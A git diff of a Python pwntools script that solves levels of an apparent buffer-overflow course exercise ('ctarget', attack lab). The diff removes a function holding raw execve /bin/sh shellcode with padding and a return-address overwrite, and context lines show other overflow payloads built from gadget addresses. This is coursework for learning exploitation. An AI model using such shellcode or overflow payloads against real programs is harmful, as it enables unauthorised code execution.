@@ -11,7 +11,7 @@ BUF_SIZE = 56
 COOKIE = int(open('cookie.txt', 'r').read(), 16)
 POPRDIRET = asm('pop rdi; ret', arch='amd64')
 
-def check_level(level: int) -> bool: return level in [1, 2, 3, 4, 5, 6]
+def check_level(level: int) -> bool: return level in [1, 2, 3, 4, 5]
 
 def get_solution_func(level: int) -> Callable[[bool], None]:
     match level:
@@ -25,8 +25,6 @@ def get_solution_func(level: int) -> Callable[[bool], None]:
             return solve_level_4
         case 5:
             return solve_level_5
-        case 6:
-            return binsh
         case _:
             raise ValueError("Invalid level")
         
@@ -62,19 +60,6 @@ def solve_level_1(flag: bool) -> None:
         + p64(0x4017fc) # touch 1
     )
     solve_ctarget(solution, flag, 1)
-
-def binsh(flag: bool) -> None:
-    binsh_shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
-    solution = (
-        binsh_shellcode
-        + b"a" * (BUF_SIZE - len(binsh_shellcode)) # padding
-        + p64(0x5561e608) # cookie hex value address
-    )
-    
-    proc = process(['./ctarget', '-q'])
-    gdb.attach(proc)
-    proc.sendline(solution)
-    proc.interactive()
 
 def solve_level_2(flag: bool) -> None:
     solution = (
